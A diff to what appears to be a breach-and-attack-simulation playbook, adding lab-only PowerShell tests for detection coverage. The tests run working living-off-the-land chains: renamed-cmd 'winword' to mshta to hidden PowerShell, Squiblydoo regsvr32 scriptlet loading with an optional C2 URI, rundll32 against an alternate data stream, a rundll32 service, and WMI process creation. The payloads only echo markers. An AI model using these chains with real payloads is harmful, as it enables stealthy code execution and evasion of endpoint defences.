@@ -386,3 +386,172 @@ steps:
     cleanup: |
       Get-BitsTransfer -Name "BAS-SIM-BITS-*" -ErrorAction SilentlyContinue | Remove-BitsTransfer -ErrorAction SilentlyContinue
       Remove-Item (Join-Path $env:TEMP 'bas_bits_*.txt') -Force -ErrorAction SilentlyContinue
+
+  # ── Lab Chains (Portion 4) ──────────────────────────────────────────────────
+  # Full-fidelity multi-stage LOLBin chains. Isolated range + snapshot required.
+
+  - name: "Office Attack Chain (lab — winword→mshta→powershell)"
+    technique_id: T1218.005
+    framework: custom
+    executor: powershell
+    timeout_sec: 30
+    fidelity: lab-only
+    production_safe: false
+    risk: high
+    blast_radius: "Copies cmd.exe to winword.exe, winword spawns mshta with inline VBScript, mshta spawns powershell.exe echo. Three-level chain. All files deleted. Triggers EDR by design."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 1: chain winword.exe→mshta.exe→powershell.exe"
+      - "Security EID 4688 for each stage (3 events)"
+    detection:
+      - "EDR: three-stage Office→mshta→PS chain — high-confidence APT initial-access pattern"
+      - "Sigma: proc_creation_win_office_spawn_process.yml chained with mshta spawn"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $ww = Join-Path $env:TEMP "winword.exe"
+      Copy-Item "$env:SystemRoot\System32\cmd.exe" $ww -Force
+      $psArg = 'powershell.exe -nop -w hidden -c "Write-Output [BAS-SIM-CHAIN-STAGE3]"'
+      $mshtaArg = 'mshta.exe vbscript:CreateObject(''WScript.Shell'').Run(''' + $psArg + ''',0,True):window.close'
+      $psi = New-Object System.Diagnostics.ProcessStartInfo
+      $psi.FileName = $ww
+      $psi.Arguments = "/c $mshtaArg"
+      $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+      $psi.CreateNoWindow = $true
+      $p = [System.Diagnostics.Process]::Start($psi)
+      if ($p) { $p.WaitForExit(15000) | Out-Null; $ec = $p.ExitCode } else { $ec = -1 }
+      Remove-Item $ww -Force -ErrorAction SilentlyContinue
+      if ($ec -ge 0) { Write-Output "EXEC LAB: winword->mshta->powershell three-stage chain fired (exit $ec) — expect Sysmon EID 1 x3 with full ancestry. [BAS-SIM]" } else { Write-Output "PASS: chain blocked at stage 1 — AppLocker/WDAC/EDR prevented Office process spawning." }
+    cleanup: |
+      Remove-Item (Join-Path $env:TEMP 'winword.exe') -Force -ErrorAction SilentlyContinue
+
+  - name: "Squiblydoo with Active JScript Payload (lab — cmd.exe spawn)"
+    technique_id: T1218.010
+    framework: custom
+    executor: powershell
+    timeout_sec: 30
+    fidelity: lab-only
+    production_safe: false
+    risk: high
+    blast_radius: "Creates .sct with active JScript that runs cmd.exe /c echo [BAS-SIM-SQUIBLYDOO] via WScript.Shell. Regsvr32 /i loads it. File deleted. Triggers EDR by design."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 7: scrobj.dll loaded by regsvr32.exe"
+      - "Sysmon EID 1: cmd.exe with ParentImage=regsvr32.exe"
+      - "Security EID 4688: regsvr32.exe + cmd.exe chain"
+    detection:
+      - "EDR: regsvr32→scrobj.dll→cmd.exe — Sigma proc_creation_win_regsvr32_squiblydoo.yml"
+      - "Sysmon: scrobj.dll image load + child cmd.exe from regsvr32 parent"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $uri = if ($env:BAS_C2_URI) { "$($env:BAS_C2_URI)/bas-squiblydoo-$runId.sct" } else { '' }
+      $sct = Join-Path $env:TEMP "bas_lab_sct_$runId.sct"
+      $sctContent = '<?XML version="1.0"?><scriptlet><registration progid="BAS" classid="{22222222-2222-2222-2222-222222222222}"><script language="JScript"><![CDATA[new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo [BAS-SIM-SQUIBLYDOO]",0,true);]]></script></registration></scriptlet>'
+      [System.IO.File]::WriteAllText($sct, $sctContent, [System.Text.Encoding]::UTF8)
+      $iArg = if ($uri) { $uri } else { $sct }
+      $p = Start-Process 'regsvr32.exe' -ArgumentList "/s /n /u /i:`"$iArg`" scrobj.dll" -PassThru -WindowStyle Hidden -ErrorAction SilentlyContinue
+      if ($p) { $p.WaitForExit(10000) | Out-Null; $ec = $p.ExitCode } else { $ec = -1 }
+      Remove-Item $sct -Force -ErrorAction SilentlyContinue
+      $cleaned = -not (Test-Path $sct)
+      if ($ec -ge 0) { Write-Output "EXEC LAB T1218.010: Squiblydoo with active JScript fired (exit $ec, cleaned=$cleaned, src=$iArg) — regsvr32->cmd chain. [BAS-SIM]" } else { Write-Output "PASS: Squiblydoo blocked — AppLocker/WDAC/ASR prevented scrobj.dll chain." }
+    cleanup: |
+      Remove-Item (Join-Path $env:TEMP 'bas_lab_sct_*.sct') -Force -ErrorAction SilentlyContinue
+
+  - name: "Rundll32 + Alternate Data Stream (lab — ADS payload)"
+    technique_id: T1218.011
+    framework: custom
+    executor: powershell
+    timeout_sec: 30
+    fidelity: lab-only
+    production_safe: false
+    risk: high
+    blast_radius: "Writes a benign string to a file's ADS (:bas_stream), reads it back, attempts rundll32 with ADS path. Sysmon EID 15 (ADS). File and stream deleted."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 15 (alternate data stream created): bas_ads_lolbin.txt:bas_stream"
+      - "Sysmon EID 1: rundll32.exe with ADS file path argument"
+      - "Security EID 4688: rundll32.exe"
+    detection:
+      - "EDR: rundll32.exe loading from ADS path — rare and suspicious"
+      - "Sysmon EID 15: ADS creation by powershell.exe — MOTW bypass / payload staging"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $file = Join-Path $env:TEMP "bas_ads_lolbin_$runId.txt"
+      Set-Content -Path $file -Value '[BAS-SIM-ADS] primary stream' -Encoding ASCII
+      Add-Content -Path "${file}:bas_stream" -Value '[BAS-SIM-ADS] T1218.011 alternate data stream payload staging' -Encoding ASCII
+      $adsExists = (Get-Item $file -Stream bas_stream -ErrorAction SilentlyContinue) -ne $null
+      $adsContent = Get-Content -Path "${file}:bas_stream" -ErrorAction SilentlyContinue
+      $p = Start-Process 'rundll32.exe' -ArgumentList "`"${file}:bas_stream.dll`",DllMain" -PassThru -WindowStyle Hidden -ErrorAction SilentlyContinue
+      if ($p) { $p.WaitForExit(3000) | Out-Null }
+      Remove-Item $file -Force -ErrorAction SilentlyContinue
+      $cleaned = -not (Test-Path $file)
+      Write-Output "EXEC LAB T1218.011+ADS: ADS created (exists=$adsExists), rundll32 invoked with ADS path, file removed (cleaned=$cleaned) — Sysmon EID 15 + EID 1. [BAS-SIM]"
+    cleanup: |
+      Remove-Item (Join-Path $env:TEMP 'bas_ads_lolbin_*.txt') -Force -ErrorAction SilentlyContinue
+
+  - name: "Service-to-LOLBin Chain (lab — sc.exe→rundll32 service)"
+    technique_id: T1569.002
+    framework: custom
+    executor: powershell
+    timeout_sec: 45
+    fidelity: lab-only
+    production_safe: false
+    risk: high
+    blast_radius: "Creates a service with rundll32.exe binpath (advapi32.dll,ProcessIdleTasks), starts, stops, deletes. Generates EID 4697+7045. Service runs as user context."
+    reversible: true
+    telemetry:
+      - "Security EID 4697 (service installed) + EID 7045 (new service)"
+      - "Sysmon EID 1: sc.exe create + rundll32.exe service start"
+      - "Security EID 4688: rundll32.exe launched by services.exe"
+    detection:
+      - "SIEM: service with LOLBin (rundll32.exe) as binary path — Sigma sysmon_suspicious_rundll32_exec.yml"
+      - "EDR: services.exe spawning rundll32.exe — service-to-LOLBin lateral-spread chain"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $svcName = "BAS-SIM-SVC-$runId"
+      $binPath = "rundll32.exe advapi32.dll,ProcessIdleTasks"
+      sc.exe create $svcName binPath= "`"$binPath`"" start= demand 2>&1 | Out-Null
+      $created = (Get-Service -Name $svcName -ErrorAction SilentlyContinue) -ne $null
+      if ($created) {
+        sc.exe start $svcName 2>&1 | Out-Null
+        Start-Sleep -Milliseconds 800
+        sc.exe stop $svcName 2>&1 | Out-Null
+        sc.exe delete $svcName 2>&1 | Out-Null
+        $gone = (Get-Service -Name $svcName -ErrorAction SilentlyContinue) -eq $null
+        Write-Output "EXEC LAB T1569.002: service '$svcName' with rundll32 binpath created+started+deleted (removed=$gone) — EID 4697+7045 + services.exe->rundll32 chain. [BAS-SIM]"
+      } else {
+        Write-Output "PASS: service creation with LOLBin binpath blocked — restricted token/AppLocker/WDAC prevented service-to-LOLBin chain."
+      }
+    cleanup: |
+      sc.exe stop  "BAS-SIM-SVC-*" 2>&1 | Out-Null
+      sc.exe delete "BAS-SIM-SVC-*" 2>&1 | Out-Null
+
+  - name: "WMI Remote Execution (lab — Invoke-WmiMethod localhost)"
+    technique_id: T1047
+    framework: custom
+    executor: powershell
+    timeout_sec: 30
+    fidelity: lab-only
+    production_safe: false
+    risk: medium
+    blast_radius: "Invoke-WmiMethod Win32_Process.Create to localhost only. Spawns cmd.exe /c echo [BAS-SIM-WMI-REMOTE] under WmiPrvSE.exe. No lateral movement to remote hosts."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 1: cmd.exe with ParentImage=WmiPrvSE.exe (remote WMI context)"
+      - "WMI-Activity/Operational EID 5857: remote WMI process creation"
+      - "Security EID 4688: cmd.exe spawned by WmiPrvSE.exe"
+    detection:
+      - "EDR: WmiPrvSE.exe spawning cmd.exe via remote WMI — Sigma proc_creation_win_wmi_spawn_process.yml"
+      - "SIEM: Win32_Process.Create from Invoke-WmiMethod to localhost — lateral execution simulation"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      try {
+        $result = Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd.exe /c echo [BAS-SIM-WMI-REMOTE]' -ComputerName localhost -ErrorAction Stop
+        Write-Output "EXEC LAB T1047: WMI Win32_Process.Create to localhost returned ProcessId=$($result.ProcessId) — cmd.exe spawned under WmiPrvSE.exe. WMI-Activity EID 5857. [BAS-SIM]"
+      } catch {
+        Write-Output "PASS: WMI remote process creation blocked — WinRM/WMI restrictions or network policy prevented Win32_Process.Create to localhost."
+      }
+    cleanup: ""
